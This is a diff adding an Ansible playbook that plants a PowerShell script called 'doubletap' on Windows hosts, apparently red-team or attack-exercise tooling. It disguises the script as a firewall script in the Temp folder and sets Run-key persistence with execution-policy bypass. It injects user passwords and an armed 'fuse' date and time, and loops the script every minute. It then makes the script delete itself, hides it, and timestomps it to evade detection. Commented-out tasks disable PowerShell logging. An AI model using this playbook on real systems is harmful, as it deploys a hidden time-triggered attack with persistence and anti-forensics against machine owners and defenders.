@@ -1,0 +1,117 @@
+---
+#- name: Define variables for paths and filenames
+#  set_fact:
+#    doubletap_ps1_loop_script_dest: "C:\\Windows\\Temp\\firewall_script1.ps1"
+#    doubletap_ps1_loop_run_key_name: "DoubleTapScript"
+
+#- name: Disable PowerShell logging by modifying the registry
+#  win_registry:
+#    path: "HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell"
+#    name: "EnableTranscripting"
+#    type: dword
+#    data: "0"
+#    state: present
+
+- name: Ensure destination directory exists on Windows
+  ansible.windows.win_file:
+    path: "{{ doubletap_ps1_loop_script_dest | win_dirname }}"
+    state: directory
+    recurse: yes
+
+- name: Copy PowerShell script to target
+  win_copy:
+    src: "files/doubletap.ps1"
+    dest: "{{ doubletap_ps1_loop_script_dest }}"
+
+- name: Add script to Run registry key to execute at startup
+  win_regedit:
+    path: "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    name: "{{ doubletap_ps1_loop_run_key_name }}"
+    data: "powershell.exe -ExecutionPolicy Bypass -File {{ doubletap_ps1_loop_script_dest }}"
+    state: present
+
+# Need to do this as separate tasks
+- name: Update users list in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$users\s*=.*'
+    line: '$users = "{{ doubletap_users }}"'
+    backrefs: yes
+
+- name: Update user password in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$users_pwd\s*=.*'
+    line: '$users_pwd = "{{ doubletap_users_pwd }}"'
+    backrefs: yes
+
+- name: Update fuse_date in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$fuse_date\s*=.*'
+    line: '$fuse_date = "{{ doubletap_fuse_date }}" # In format YYYY-MM-DD in America/New_York timezone'
+    backrefs: yes
+
+- name: Update fuse_time in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$fuse_time\s*=.*'
+    line: '$fuse_time = "{{ doubletap_fuse_time }}" # In format HH:MM:SS, using 24h time in America/New_York timezone'
+    backrefs: yes
+
+- name: Update fuse_armed in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$fuse_armed\s*=.*'
+    line: '$fuse_armed = ${{ doubletap_fuse_armed }} # DO NOT SET THIS TO TRUE UNLESS YOU WANT TO EXPLODE'
+    backrefs: yes
+
+- name: Update log_location in the script file
+  community.windows.win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    regexp: '^\$log_location\s*=.*'
+    line: '$log_location = {{ doubletap_ps1_loop_log_path }} # Set to $null for no output (and comment out line 14)'
+    backrefs: yes
+
+- name: Ensure PowerShell script runs every 60 seconds by adding a loop at the start and end
+  win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    line: |
+      while ($true) {
+    insertafter: "^(# Start)$"
+
+- name: Add start-sleep and closing brace to end of the PowerShell script
+  win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    line: |
+      Start-Sleep -Seconds 60
+      }
+    insertafter: "^(# End)$"
+
+- name: Add script deletion at the end of the PowerShell script
+  win_lineinfile:
+    path: "{{ doubletap_ps1_loop_script_dest }}"
+    line: 'Remove-Item -Path $MyInvocation.MyCommand.Path -Force'
+    insertafter: 'Log " My work here is done"'
+
+- name: Apply hidden and system attributes to the PowerShell script
+  win_shell: |
+    attrib +h +s "{{ doubletap_ps1_loop_script_dest }}"
+
+- name: Timestomp script and task to evade detection
+  win_shell: |
+    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").CreationTime = $time
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").LastWriteTime = $time
+    (Get-Item "{{ doubletap_ps1_loop_script_dest }}").LastAccessTime = $time
+  args:
+    executable: "powershell.exe"
+
+#- name: Timestomp registry key to evade detection
+#  win_shell: |
+#    $time = (Get-Item "C:\\Windows\\System32\\cmd.exe").CreationTime
+#    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").CreationTime = $time
+#    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").LastWriteTime = $time
+#    (Get-Item "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{{ doubletap_ps1_loop_run_key_name }}").LastAccessTime = $time
+#  args:
+#    executable: "powershell.exe"
